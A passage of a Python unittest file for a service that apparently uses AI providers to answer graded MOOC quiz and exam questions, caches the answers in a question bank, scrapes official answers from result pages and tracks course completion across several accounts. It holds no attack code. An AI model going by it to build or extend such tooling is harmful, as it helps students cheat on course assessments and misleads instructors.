        img_hash = main._hash_images([img])
        self.client.post("/api/bank", json={"type": "single", "title": "看图题", "options": ["甲", "乙"],
                                            "answer": "A", "subject": "图片", "image_hash": img_hash})
        with mock.patch.object(main, "call_provider", mock.AsyncMock(side_effect=AssertionError("不应调用 AI"))):
            hit = self.client.post("/query", json={"title": "换了个标题", "type": "single",
                                                   "options": ["甲", "乙"], "subject": "图片",
                                                   "images": [img]}).json()
        self.assertEqual(hit["code"], 0)
        self.assertFalse(hit["data"]["ai"])
        self.assertEqual(hit["data"]["provider"], "本地题库")

        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            other = self.client.post("/query", json={"title": "换了个标题", "type": "single",
                                                     "options": ["甲", "乙"], "subject": "图片",
                                                     "images": ["data:image/png;base64,BBB"]}).json()
        self.assertEqual(other["data"]["provider"], "主 AI")

    def test_image_auto_saved_with_hash(self):
        img = "data:image/png;base64,CCC"
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            self.client.post("/query", json={"title": "图片入库自检", "type": "single",
                                             "options": ["甲", "乙"], "subject": "图片自检",
                                             "images": [img]})
        items = self.client.get("/api/bank", params={"keyword": "图片入库自检"}).json()["items"]
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["image_hash"], main._hash_images([img]))


    def test_calibrate_job(self):
        main.cache.set("c1", "校准缓存题", "A", "m", "single", '["甲","乙"]', "默认")
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"B"}')):
            started = self.client.post("/api/bank/calibrate", json={"limit": 10}).json()
            self.assertTrue(started["started"])
            self.assertGreaterEqual(started["total"], 1)
            status = {}
            for _ in range(80):
                time.sleep(0.1)
                status = self.client.get("/api/calibrate/status").json()
                if not status["running"]:
                    break
        self.assertFalse(status["running"])
        # 校准只写待确认，不直接采纳
        self.assertEqual(status["adopted"], 0)
        self.assertEqual(status["pending"], 1)
        items = self.client.get("/api/bank", params={"keyword": "校准缓存题"}).json()["items"]
        self.assertEqual(items[0]["answer"], "B")
        self.assertEqual(items[0]["status"], "pending")
        self.assertEqual(items[0]["source"], "calibrated")
        self.assertEqual(items[0]["level"], 2)

    def test_singleflight_dedupes_concurrent_same_question(self):
        main.settings.update({
            "cross_check": False, "low_conf_vote": False,
            "image_two_stage": False, "strict_official": False,
        })
        calls = 0

        async def fake_call(provider, messages):
            nonlocal calls
            calls += 1
            await asyncio.sleep(0.05)
            return '{"answer":"A"}'

        async def run():
            with mock.patch.object(main, "call_provider", fake_call):
                return await asyncio.gather(
                    main._resolve("并发同题", "single", '["甲","乙"]'),
                    main._resolve("并发同题", "single", '["甲","乙"]'),
                )

        responses = asyncio.run(run())
        self.assertEqual(calls, 1)
        self.assertTrue(all(resp.status_code == 200 for resp in responses))
        items = main.bank.all()
        self.assertEqual(len(items), 1)
        self.assertEqual((items[0]["source"], items[0]["status"]), ("ai", "pending"))

    def test_subject_auto_classify(self):
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            data = self.client.post("/query", json={"title": "计算下列行列式的值",
                                                   "type": "single", "options": ["1", "2"]}).json()
        self.assertEqual(data["data"]["subject"], "线性代数")
        items = self.client.get("/api/bank", params={"subject": "线性代数"}).json()["items"]
        self.assertEqual(len(items), 1)

    def test_subject_rules_api(self):
        rules = [{"name": "测试课", "keywords": ["专属关键词"]}]
        saved = self.client.put("/api/subject-rules", json={"rules": rules}).json()
        self.assertEqual(saved["rules"], rules)
        self.assertEqual(self.client.get("/api/subject-rules").json()["rules"], rules)
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
            data = self.client.post("/query", json={"title": "这里出现专属关键词",
                                                   "type": "single", "options": ["甲", "乙"]}).json()
        self.assertEqual(data["data"]["subject"], "测试课")


    def test_settings_api(self):
        self.assertFalse(self.client.get("/api/settings").json()["cross_check"])
        saved = self.client.put("/api/settings", json={"cross_check": True, "image_two_stage": True}).json()
        self.assertTrue(saved["cross_check"])
        self.assertTrue(self.client.get("/api/settings").json()["image_two_stage"])

    def test_cross_check_agree(self):
        main.store.add({"name": "备用", "base_url": "https://b.example.com/v1", "api_key": "k", "model": "m"})
        main.settings.update({"cross_check": True})
        for _ in range(3):
            with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A"}')):
                data = self.client.post("/query", json={"title": "交叉题", "type": "single",
                                                        "options": ["甲", "乙"]}).json()
        self.assertEqual(data["data"]["cross"], "agree")
        item = self.client.get("/api/bank", params={"keyword": "交叉题"}).json()["items"][0]
        self.assertEqual(item["status"], "adopted")

    def test_cross_check_disagree(self):
        main.store.add({"name": "备用", "base_url": "https://b.example.com/v1", "api_key": "k", "model": "m"})
        main.settings.update({"cross_check": True})
        calls = {"n": 0}

        async def fake(provider, messages):
            calls["n"] += 1
            return '{"answer":"A"}' if calls["n"] == 1 else '{"answer":"B"}'

        with mock.patch.object(main, "call_provider", fake):
            data = self.client.post("/query", json={"title": "交叉冲突题", "type": "single",
                                                    "options": ["甲", "乙"]}).json()
        self.assertEqual(data["data"]["cross"], "disagree")
        item = self.client.get("/api/bank", params={"keyword": "交叉冲突题"}).json()["items"][0]
        self.assertEqual(item["status"], "pending")
        self.assertTrue(item["conflict"])

    def test_bank_import_json_and_csv(self):
        result = self.client.post("/api/bank/import", json={"items": [
            {"type": "single", "title": "导入1", "options": ["甲", "乙"], "answer": "A"},
            {"type": "single", "title": "坏题", "options": ["甲"], "answer": "A"},
        ]}).json()
        self.assertEqual(result["imported"], 1)
        self.assertEqual(result["skipped"], 1)
        again = self.client.post("/api/bank/import", json={"items": [
            {"type": "single", "title": "导入1", "options": ["甲", "乙"], "answer": "A"},
        ]}).json()
        self.assertEqual(again["imported"], 0)
        csv_text = "type,title,options,answer\nsingle,CSV导入,\"甲|乙\",A\n"
        csv_result = self.client.post("/api/bank/import", json={
            "content": csv_text, "format": "csv", "subject": "CSV课"
        }).json()
        self.assertEqual(csv_result["imported"], 1)
        items = self.client.get("/api/bank", params={"subject": "CSV课"}).json()["items"]
        self.assertEqual(items[0]["title"], "CSV导入")

    def test_image_two_stage(self):
        main.settings.update({"image_two_stage": True})
        img = "data:image/png;base64,TTT"
        calls = []

        async def fake(provider, messages):
            calls.append(messages)
            if len(calls) == 1:
                return "图中是一个三角形"
            return '{"answer":"A"}'

        with mock.patch.object(main, "call_provider", fake):
            data = self.client.post("/query", json={"title": "两阶段图题", "type": "single",
                                                    "options": ["甲", "乙"], "images": [img]}).json()
        self.assertEqual(data["data"]["answer"], "A")
        self.assertTrue(data["data"]["two_stage"])
        self.assertIsNotNone(main.cache.get_transcript(main._hash_images([img])))


    def test_failure_log(self):
        data = self.client.get("/query", params={"title": "简答", "type": "essay"}).json()
        self.assertEqual(data["code"], 40002)
        fails = self.client.get("/api/failures").json()
        self.assertEqual(fails["count"], 1)
        self.assertEqual(fails["items"][0]["code"], 40002)
        self.assertEqual(self.client.delete("/api/failures").json()["cleared"], 1)
        self.assertEqual(self.client.get("/api/failures").json()["count"], 0)

    def test_failure_log_keeps_long_title(self):
        """图片题的题干是长 URL 串，截到 300 字就再也匹配不上题库里的官方题。"""
        url = "http://edu-image.nosdn.127.net/_PhotoUploadUtils_3b863abc-cdc2-4a79-b86a-38718dcbd9e6.png"
        title = (f"设 {url} 为三阶方阵， {url} 将 {url} 按列分块为 "
                 f"{url} 则行列式的值为")
        self.assertGreater(len(title), 300)
        self.client.get("/query", params={"title": title, "type": "essay"})
        fails = self.client.get("/api/failures").json()
        self.assertEqual(fails["count"], 1)
        self.assertEqual(fails["items"][0]["title"], title)

    def test_failure_log_keeps_long_options(self):
        """选项里的图片 URL 超过 200 字时不能被截断，否则选项对不上。"""
        url = "http://edu-image.nosdn.127.net/_PhotoUploadUtils_3b863abc-cdc2-4a79-b86a-38718dcbd9e6.png"
        option = f"若 {url} 可逆, 则 {url} 可逆." * 3
        self.assertGreater(len(option), 200)
        self.client.get("/query", params={
            "title": "长选项题", "type": "single",
            "options": json.dumps([option, "乙"]),
        })
        fails = self.client.get("/api/failures").json()
        self.assertEqual(fails["count"], 1)
        stored = fails["items"][0]["options"]
        self.assertEqual(len(stored[0]), len(option))
        self.assertEqual(stored[1], "乙")

    def test_failure_log_merges_same_question(self):
        """同一道题重复失败只留一行，次数累加，时间取首末。"""
        main.failures.clear()
        base = {"code": 50001, "type": "completion", "title": "同一道填空题",
                "options": [], "subject": "默认", "images": 0}
        main.failures.add(dict(base, at=100.0, message="HTTP 503"))
        main.failures.add(dict(base, at=200.0, message="HTTP 503 again"))
        items = main.failures.all()
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["count"], 2)
        self.assertEqual(items[0]["first_at"], 100.0)
        self.assertEqual(items[0]["at"], 200.0)
        self.assertEqual(items[0]["message"], "HTTP 503 again")
        self.assertEqual(items[0]["kind"], "transient")
        self.assertTrue(items[0]["retryable"])
        fails = self.client.get("/api/failures").json()
        self.assertEqual(fails["count"], 1)
        self.assertEqual(fails["events"], 2)

    def test_failure_log_compacts_legacy_duplicates(self):
        """旧文件里的重复记录在加载时合并，不再占满 200 条上限。"""
        path = os.path.join(self.tmp.name, "legacy_failures.json")
        records = [
            {"at": 200.0, "code": 50001, "type": "single", "title": "旧题",
             "options": ["A", "B"], "subject": "", "images": 0, "message": "new"},
            {"at": 100.0, "code": 50001, "type": "single", "title": "旧题",
             "options": ["A", "B"], "subject": "", "images": 0, "message": "old"},
            {"at": 150.0, "code": 50001, "type": "single", "title": "旧题",
             "options": ["A", "B"], "subject": "", "images": 0, "message": "mid"},
        ]
        with open(path, "w", encoding="utf-8") as fp:
            json.dump({"items": records}, fp, ensure_ascii=False)
        items = main.FailureLog(path).all()
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["count"], 3)
        self.assertEqual(items[0]["first_at"], 100.0)
        self.assertEqual(items[0]["at"], 200.0)
        self.assertEqual(items[0]["message"], "new")

    def test_failure_log_resolve_removes_answered_question(self):
        """题目被答对后，对应失败记录自动消失；不同题不误删。"""
        main.failures.clear()
        main.failures.add({"at": 100.0, "code": 50001, "type": "single",
                           "title": "后来答对的题", "options": ["甲", "乙"],
                           "subject": "默认", "images": 0, "message": "HTTP 503"})
        self.assertEqual(main.failures.resolve("后来答对的题", ["甲", "乙"]), 1)
        self.assertEqual(main.failures.all(), [])
        main.failures.add({"at": 101.0, "code": 50001, "type": "single",
                           "title": "另一道题", "options": ["甲", "乙"],
                           "subject": "默认", "images": 0, "message": "HTTP 503"})
        self.assertEqual(main.failures.resolve("不存在的题", []), 0)
        self.assertEqual(len(main.failures.all()), 1)

    def test_query_success_clears_matching_failure(self):
        """走完 /query 成功后，失败记录在同一次请求里被清掉。"""
        main.failures.clear()
        main.failures.add({"at": 100.0, "code": 50001, "type": "single",
                           "title": "首都是哪", "options": ["北京", "上海"],
                           "subject": "默认", "images": 0, "message": "HTTP 503"})

        async def fake(provider, messages):
            return '{"answer":"A"}'

        with mock.patch.object(main, "call_provider", fake):
            data = self.client.post("/query", json={
                "title": "首都是哪", "type": "single",
                "options": ["北京", "上海"]}).json()
        self.assertEqual(data["code"], 0)
        self.assertEqual(data["data"]["answer"], "A")
        self.assertEqual(main.failures.all(), [])

    def test_concurrency_limit(self):
        active = {"now": 0, "max": 0}

        async def fake(provider, messages):
            active["now"] += 1
            active["max"] = max(active["max"], active["now"])
            await asyncio.sleep(0.05)
            active["now"] -= 1
            return '{"answer":"A"}'

        providers = [{"id": str(i), "name": f"p{i}", "vision": "auto", "timeout": 30} for i in range(6)]

        async def run():
            with mock.patch.object(main, "call_provider", fake):
                await asyncio.gather(*[
                    main._ask_limited(providers, "single", ["x", "y"], [], None, False)
                    for _ in range(6)
                ])

        asyncio.run(run())
        self.assertLessEqual(active["max"], main.config.MAX_CONCURRENCY)


    def test_provider_prompt_and_limits(self):
        pid = self.client.get("/api/state").json()["providers"][0]["id"]
        self.client.put(f"/api/providers/{pid}", json={"name": "主 AI", "base_url": "https://example.com/v1",
                                                       "model": "test-model", "system_prompt": "只回 JSON",
                                                       "max_tokens": 512})
        provider = self.client.get("/api/state").json()["providers"][0]
        self.assertEqual(provider["system_prompt"], "只回 JSON")
        self.assertEqual(provider["max_tokens"], 512)
        from app import llm

        payload = llm._payload({"model": "m", "max_tokens": 512},
                               [{"role": "user", "content": "hi"}], "chat_completions")
        self.assertEqual(payload["max_tokens"], 512)

    def test_context_injected(self):
        captured = {}

        async def fake(provider, messages):
            captured["messages"] = messages
            return '{"answer":"A"}'

        with mock.patch.object(main, "call_provider", fake):
            self.client.post("/query", json={"title": "上下文题", "type": "single",
                                             "options": ["甲", "乙"], "context": "第三章 单元测验"})
        body = captured["messages"][1]["content"]
        self.assertIn("第三章 单元测验", body)

    def test_multiple_conservative(self):
        main.settings.update({"multiple_conservative": True})
        with mock.patch.object(main, "call_provider", mock.AsyncMock(return_value='{"answer":"A#B#C"}')):
            data = self.client.post("/query", json={"title": "多选保守", "type": "multiple",
                                                   "options": ["甲", "乙", "丙"]}).json()
        self.assertEqual(data["data"]["answer"], "A#B")


    def test_progress_missing_tasks(self):
        self.client.post("/api/progress", json={
            "account": "甲", "course": "缺漏课", "done": 1, "total": 3, "key": "缺漏课|3",
            "extra": {"items": [
                {"t": "video", "n": "视频一", "c": "第一章", "l": "第一节", "d": 1},
                {"t": "doc", "n": "文档一", "c": "第一章", "l": "第一节", "d": 0},
                {"t": "quiz", "n": "测验一", "c": "第一章", "l": "第二节", "d": 0},
                {"t": "video", "n": "视频二", "c": "第一章", "l": "第一节", "d": 0},
            ]},
        })
        data = self.client.get("/api/progress/missing").json()
        self.assertEqual(data["total"], 3)
        self.assertEqual(data["summary"][0]["doc"], 1)
        self.assertEqual(data["summary"][0]["quiz"], 1)
        self.assertEqual(data["items"][0]["title"], "文档一")
        self.assertEqual(data["chapters"][0]["chapter"], "第一章")
        self.assertEqual(data["chapters"][0]["total"], 4)
        self.assertEqual(data["chapters"][0]["missing"], 3)
        self.assertEqual(data["chapters"][0]["video_missing"], 1)
        csv_resp = self.client.get("/api/progress/missing.csv")
        self.assertIn("文档", csv_resp.text)
        self.assertIn("测验", csv_resp.text)

    def test_progress_deadline_persists(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "截止课", "done": 1, "total": 4,
                                               "key": "截止课|4", "deadline": "2027-01-11"})
        self.client.post("/api/progress", json={"account": "甲", "course": "截止课", "done": 2, "total": 4,
                                               "key": "截止课|4"})
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["deadline"], "2027-01-11")

    def test_progress_history_and_today_delta(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "趋势课", "done": 3, "total": 10, "key": "趋势课|10"})
        self.client.post("/api/progress", json={"account": "甲", "course": "趋势课", "done": 5, "total": 10, "key": "趋势课|10"})
        self.client.post("/api/progress", json={"account": "甲", "course": "趋势课", "done": 6, "total": 10, "key": "趋势课|10"})
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(len(row["history"]), 3)
        self.assertEqual(row["today_delta"], 3)

    def test_progress_export_csv(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "导出课", "done": 4, "total": 8,
                                               "chapter": "第一章", "section": "第一节", "key": "导出课|8",
                                               "extra": {"tasks": {"video": {"done": 2, "total": 5}}}})
        resp = self.client.get("/api/progress/export.csv")
        self.assertEqual(resp.status_code, 200)
        self.assertIn("text/csv", resp.headers["content-type"])
        self.assertIn("导出课", resp.text)
        self.assertIn("2/5", resp.text)

    def test_progress_report(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "线性代数", "done": 3, "total": 10})
        self.client.post("/api/progress", json={"account": "甲", "course": "线性代数", "done": 6, "total": 10})
        self.client.post("/api/progress", json={"account": "乙", "course": "计组", "done": 5, "total": 5})
        self.client.post("/api/progress", json={"account": "丙", "course": "慕课", "percent": 35})
        data = self.client.get("/api/progress").json()
        self.assertEqual(data["count"], 3)
        rows = {i["account"] + "|" + i["course"]: i for i in data["items"]}
        self.assertEqual(rows["甲|线性代数"]["done"], 6)
        self.assertEqual(rows["丙|慕课"]["percent"], 35)
        self.assertEqual(self.client.delete("/api/progress").json()["cleared"], 3)
        self.assertEqual(self.client.get("/api/progress").json()["count"], 0)

    def test_progress_duplicate_course_names_keep_separate_rows(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "高等数学", "done": 161,
                                               "total": 166, "key": "https://x/learn/1001"})
        self.client.post("/api/progress", json={"account": "甲", "course": "高等数学", "done": 128,
                                               "total": 128, "key": "https://x/learn/1002"})
        data = self.client.get("/api/progress").json()
        self.assertEqual(data["count"], 2)
        rows = {i["key"].rsplit("/", 1)[-1]: i for i in data["items"]}
        self.assertEqual(rows["1001"]["done"], 161)
        self.assertEqual(rows["1002"]["done"], 128)

    def test_progress_keyed_rows_replace_legacy_collapsed_row(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "实用写作", "done": 51, "total": 55})
        self.client.post("/api/progress", json={"account": "甲", "course": "实用写作", "done": 51,
                                               "total": 55, "key": "https://x/learn/2001"})
        self.client.post("/api/progress", json={"account": "甲", "course": "实用写作", "done": 68,
                                               "total": 68, "key": "https://x/learn/2002"})
        data = self.client.get("/api/progress").json()
        self.assertEqual(data["count"], 2)
        self.assertEqual(sorted(i["done"] for i in data["items"]), [51, 68])

    def test_progress_records_chapter_section_and_live(self):
        self.client.post("/api/progress", json={
            "account": "甲", "course": "线性代数", "done": 12, "total": 40,
            "chapter": "第3章 向量", "section": "3.2 线性相关", "live": True
        })
        self.client.post("/api/progress", json={
            "account": "甲", "course": "线性代数", "done": 13, "total": 40
        })
        item = [i for i in self.client.get("/api/progress").json()["items"] if i["account"] == "甲"][0]
        self.assertEqual(item["chapter"], "第3章 向量")
        self.assertEqual(item["section"], "3.2 线性相关")
        self.assertTrue(item["live"])
        self.client.post("/api/progress", json={
            "account": "甲", "course": "线性代数", "done": 13, "total": 40, "live": False
        })
        item = [i for i in self.client.get("/api/progress").json()["items"] if i["account"] == "甲"][0]
        self.assertFalse(item["live"])

    def test_progress_ignores_site_name_as_course(self):
        r = self.client.post("/api/progress", json={"account": "甲", "course": "网易icourse163", "done": 1, "total": 2})
        self.assertTrue(r.json().get("ignored"))
        self.assertEqual(self.client.get("/api/progress").json()["count"], 0)

    def test_progress_position_only_keeps_ratio_and_merges_by_course(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "概率论与数理统计", "done": 6,
                                               "total": 24, "key": "概率论与数理统计|24"})
        self.client.post("/api/progress", json={"account": "甲", "course": "概率论与数理统计",
                                               "chapter": "第一章 随机事件及其概率",
                                               "section": "第五节 事件的独立性", "live": True,
                                               "position_only": True})
        data = self.client.get("/api/progress").json()
        self.assertEqual(data["count"], 1)
        row = data["items"][0]
        self.assertEqual(row["key"], "概率论与数理统计|24")
        self.assertEqual(row["done"], 6)
        self.assertEqual(row["total"], 24)
        self.assertEqual(row["chapter"], "第一章 随机事件及其概率")
        self.assertTrue(row["live"])

    def test_progress_position_only_matches_latest_of_same_name(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "高等数学", "done": 128,
                                               "total": 128, "key": "高等数学|128"})
        self.client.post("/api/progress", json={"account": "甲", "course": "高等数学", "done": 161,
                                               "total": 166, "key": "高等数学|166"})
        self.client.post("/api/progress", json={"account": "甲", "course": "高等数学",
                                               "chapter": "第4章 不定积分", "live": True, "position_only": True})
        rows = {i["key"]: i for i in self.client.get("/api/progress").json()["items"]}
        self.assertEqual(rows["高等数学|166"]["chapter"], "第4章 不定积分")
        self.assertEqual(rows["高等数学|166"]["done"], 161)
        self.assertEqual(rows["高等数学|128"]["chapter"], "")

    def test_progress_merges_task_counts_in_extra(self):
        self.client.post("/api/progress", json={"account": "甲", "course": "概率论", "done": 6, "total": 24,
                                               "key": "概率论|24", "extra": {"source": "course-card"}})
        self.client.post("/api/progress", json={"account": "甲", "course": "概率论", "position_only": True,
                                               "live": True,
                                               "extra": {"source": "position",
                                                         "tasks": {"video": {"done": 1, "total": 3}}}})
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["extra"]["tasks"]["video"], {"done": 1, "total": 3})
        self.assertEqual(row["extra"]["source"], "position")

    def test_progress_keeps_task_items_after_card_report(self):
        items = [{"t": "video", "n": "4-1-1 数学期望", "c": "第四章", "l": "第一节", "d": 1}]
        self.client.post("/api/progress", json={"account": "甲", "course": "概率论", "key": "概率论|24",
                                               "position_only": True, "extra": {"tasks": {"video": {"done": 1, "total": 2}},
                                                                                "items": items}})
        self.client.post("/api/progress", json={"account": "甲", "course": "概率论", "key": "概率论|24",
                                               "done": 6, "total": 24, "extra": {"source": "course-card"}})
        row = self.client.get("/api/progress").json()["items"][0]
        self.assertEqual(row["extra"]["items"], items)
        self.assertEqual(row["extra"]["tasks"]["video"]["total"], 2)

    def test_progress_requires_account_course(self):
        self.assertEqual(self.client.post("/api/progress", json={"account": "甲"}).status_code, 400)


class MoocResultTests(unittest.TestCase):
    def test_answers_match_normalizes_format(self):
        from app.mooc_result import _answers_match

        self.assertTrue(_answers_match("multiple", "C#A", "A#C", ["甲", "乙", "丙"]))
        self.assertTrue(_answers_match("judge", "对", "正确", ["对", "错"]))
        self.assertTrue(_answers_match("judge", "错", "错误", ["对", "错"]))
        self.assertTrue(_answers_match("completion", " 12 。", "12", []))
        self.assertFalse(_answers_match("single", "A", "B", ["甲", "乙"]))
        self.assertFalse(_answers_match("multiple", "A#B", "A#C", ["甲", "乙", "丙"]))
        self.assertFalse(_answers_match("judge", "正确", "错误", ["对", "错"]))

    def test_parse_single_and_judge(self):
        html = (
            '<div class="m-choiceQuestion u-questionItem analysisMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">1+1=?</div>'
            '<div class="qaMark j-qamark"></div></div>'
            '<div class="j-choicebox"><div><ul class="choices f-cb">'
            '<li class="f-cb  "><input type="radio" disabled><label><div class="optionPos">A.</div>'
            '<div class="f-richEditorText optionCnt">1</div></label></li>'
            '<li class="f-cb checked"><input type="radio" checked disabled><label><div class="optionPos">B.</div>'
            '<div class="f-richEditorText optionCnt">2</div></label></li></ul>'
            '<div class="analysisInfo"><div><span class="tt1">正确答案：</span><span class="tt2">B</span>'
            '<span class="tt3">你选对了</span></div></div></div></div></div>'
            '<div class="m-choiceQuestion u-questionItem">'
            '<div class="j-title"><div class="j-richTxt">地球是圆的</div><div class="qaMark"></div></div>'
            '<div class="j-choicebox"><ul class="choices">'
            '<li class="checked"><input type="radio" checked disabled><div class="optionPos">A.</div>'
            '<div class="optionCnt"><span class="u-icon-correct"></span></div></li>'
            '<li><div class="optionPos">B.</div>'
            '<div class="optionCnt"><span class="u-icon-wrong"></span></div></li></ul>'
            '<div class="analysisInfo"><div><span class="tt2">A</span><span class="tt3">你选对了</span></div></div>'
            '</div></div>'
        )
        items = main.parse_result_html(html)
        self.assertEqual(len(items), 2)
        self.assertEqual(items[0]["type"], "single")
        self.assertEqual(items[0]["options"], ["1", "2"])
        self.assertEqual(items[0]["correct_letters"], ["B"])
        self.assertTrue(items[0]["is_correct"])
        self.assertEqual(items[1]["type"], "judge")
        self.assertEqual(items[1]["options"], ["正确", "错误"])
        self.assertEqual(items[1]["correct_text"], "正确")

    def test_parse_result_ignores_score_icon_as_option_text(self):
        """score 区块的对错图标不能当成选项内容。

        旧实现整段 <li> 搜 u-icon-correct，把得分图标当成选项文本，
        公式图片选项被写成「正确」，答案字母按内容映射就指错项。
        """
        html = (
            '<div class="m-choiceQuestion u-questionItem analysisMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">看图选答案</div>'
            '<div class="qaMark j-qamark"></div></div>'
            '<div class="j-choicebox"><div><ul class="choices f-cb">'
            '<li class="f-cb  "><input type="radio" disabled><label><div class="optionPos">A.</div>'
            '<div class="f-richEditorText optionCnt">'
            '<p><img src="http://x/a.png"></p></div>'
            '<div class="score f-fr"></div></label></li>'
            '<li class="f-cb checked right"><input type="radio" checked disabled><label>'
            '<div class="optionPos">B.</div>'
            '<div class="f-richEditorText optionCnt">'
            '<p><img src="http://x/b.png"></p></div>'
            '<div class="score f-fr"><span class="f-icon u-icon-correct"></span>10.00/10.00</div>'
            '</label></li></ul>'
            '<div class="analysisInfo"><div><span class="tt1">正确答案：</span><span class="tt2">B</span>'
            '<span class="tt3">你选对了</span></div></div></div></div></div>'
        )
        items = main.parse_result_html(html)
        self.assertEqual(len(items), 1)
        self.assertEqual(items[0]["options"], ["http://x/a.png", "http://x/b.png"])
        self.assertNotIn("正确", items[0]["options"])
        self.assertNotIn("错误", items[0]["options"])
        self.assertEqual(items[0]["correct_letters"], ["B"])

    def test_parse_result_keeps_option_text_with_polluted_score(self):
        """得分图标污染时，选项正文文字仍要保留。"""
        html = (
            '<div class="m-choiceQuestion u-questionItem analysisMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">文字选项题</div>'
            '<div class="qaMark j-qamark"></div></div>'
            '<div class="j-choicebox"><div><ul class="choices f-cb">'
            '<li class="f-cb checked wrong"><input type="radio" checked disabled><label>'
            '<div class="optionPos">A.</div>'
            '<div class="f-richEditorText optionCnt">36</div>'
            '<div class="score f-fr"><span class="f-icon u-icon-wrong"></span>0.00/10.00</div>'
            '</label></li>'
            '<li class="f-cb"><input type="radio" disabled><label><div class="optionPos">B.</div>'
            '<div class="f-richEditorText optionCnt">72</div>'
            '<div class="score f-fr"></div></label></li></ul>'
            '<div class="analysisInfo answrong"><div><span class="tt1">正确答案：</span>'
            '<span class="tt2">B</span><span class="tt3">你错选为A</span></div></div>'
            '</div></div></div>'
        )
        items = main.parse_result_html(html)
        self.assertEqual(items[0]["options"], ["36", "72"])
        self.assertEqual(items[0]["correct_letters"], ["B"])
        self.assertFalse(items[0]["is_correct"])

    def test_parse_result_keeps_image_url_in_option(self):
        """图片选项要保留 URL：请求侧与 paper 通道都带 URL，抹掉就对不上同题。"""
        html = (
            '<div class="m-choiceQuestion u-questionItem analysisMode">'
            '<div class="j-title title f-cb">'
            '<div class="f-richEditorText j-richTxt">设<img src="http://x/q.png">为三阶方阵</div>'
            '<div class="qaMark j-qamark"></div></div>'
            '<div class="j-choicebox"><div><ul class="choices f-cb">'
            '<li class="f-cb"><input type="radio" disabled><label><div class="optionPos">A.</div>'
            '<div class="f-richEditorText optionCnt">'
            '<p><img src="http://x/o1.png"></p></div></label></li>'
            '<li class="f-cb checked right"><input type="radio" checked disabled><label>'
            '<div class="optionPos">B.</div>'
            '<div class="f-richEditorText optionCnt">'
            '<p><img src="http://x/o2.png"></p></div>'
            '<div class="score f-fr"><span class="f-icon u-icon-correct"></span>10.00/10.00</div>'
            '</label></li></ul>'
            '<div class="analysisInfo"><div><span class="tt1">正确答案：</span><span class="tt2">B</span>'
            '<span class="tt3">你选对了</span></div></div></div></div></div>'
        )
        items = main.parse_result_html(html)
        self.assertIn("http://x/q.png", items[0]["title"])
        self.assertEqual(items[0]["options"], ["http://x/o1.png", "http://x/o2.png"])

    def test_parse_result_detects_fill_blank_question(self):
        """填空题要认出来：页面里是 textarea，没有 <li> 选项。

        不认出来的话会被当成 single，而 tt2 里是答案原文（不是选项字母），
        于是 correct_letters 解析成空，官方答案写不进题库。
        """
        html = (
            '<div class="m-FillBlank u-questionItem f-pr analysisMode">'
            '<div class="j-title title f-cb"><div class="position f-fl">8</div>'
            '<div class="qaCate j-qacate f-fl"><span class="pan">填空</span>(10分)</div>'
            '<div class="f-richEditorText j-richTxt">设A为三阶方阵，则行列式的值为</div>'
            '<div class="qaMark j-qamark"></div></div>'
            '<div class="f-cb inputArea"><div class="f-fl j-input input">'
            '<textarea name="inputtxt" class="j-textarea inputtxt"></textarea>'
            '<label class="j-hint inputhint">你没有填写答案</label>'
            '</div></div>'
            '<div class="analysisInfo j-analysis answrong">'
            '<span class="tt1">正确答案：</span><span class="tt2">-1</span></div></div>'
        )
        items = main.parse_result_html(html)
        self.assertEqual(items[0]["type"], "completion")
        self.assertEqual(items[0]["correct_text"], "-1")
        self.assertEqual(items[0]["correct_letters"], [])
        # 答案要真的能被取出来（apply_feedback 用它写题库）
        from app.mooc_result import _answer_text
        self.assertEqual(_answer_text(items[0]), "-1")

    def test_parse_exam_page_marks_hidden_analysis_invisible(self):
        """答题页的隐藏答案块不是官方答案：tt2 是占位/错位值，必须拒绝。

        实测同一道题答题页 tt2 写 2、提交后的结果页写 3，整页 tt2 还会
        整体错位（第 9 题拿到第 8 题的答案）。这些值一旦当反馈写库，
        填空题的正确率会被直接打穿。
        """
        html = (
            '<div class="m-FillBlank u-questionItem f-pr examMode">'
            '<div class="j-title title f-cb"><div class="f-richEditorText j-richTxt">'
            '若六阶矩阵存在一个非零的三阶子式</div><div class="qaMark j-qamark"></div></div>'
            '<div class="f-cb inputArea"><div class="f-fl j-input input">'
            '<textarea name="inputtxt" class="j-textarea inputtxt"></textarea></div></div>'
            '<div class="analysisInfo j-analysis f-dn">'
            '<span class="tt1">正确答案：</span><span class="tt2">2</span></div></div>'
        )
        items = main.parse_result_html(html)
        self.assertEqual(len(items), 1)
        self.assertFalse(items[0]["analysis_visible"])
        self.assertEqual(items[0]["correct_text"], "")
        # 即使调用方不看 analysis_visible，_answer_text 也拿不到答案
        from app.mooc_result import _answer_text
        self.assertIsNone(_answer_text(items[0]))

    def test_apply_feedback_skips_hidden_exam_answer(self):
        """隐藏答案块即使被送进 apply_feedback，也不能写题库。"""
        from app.mooc_result import apply_feedback

        with tempfile.TemporaryDirectory() as tmp:
            bank = Bank(os.path.join(tmp, "bank.json"))
            result = apply_feedback(
                bank,
                [{"type": "completion", "title": "设 A 是三阶方阵", "options": [],
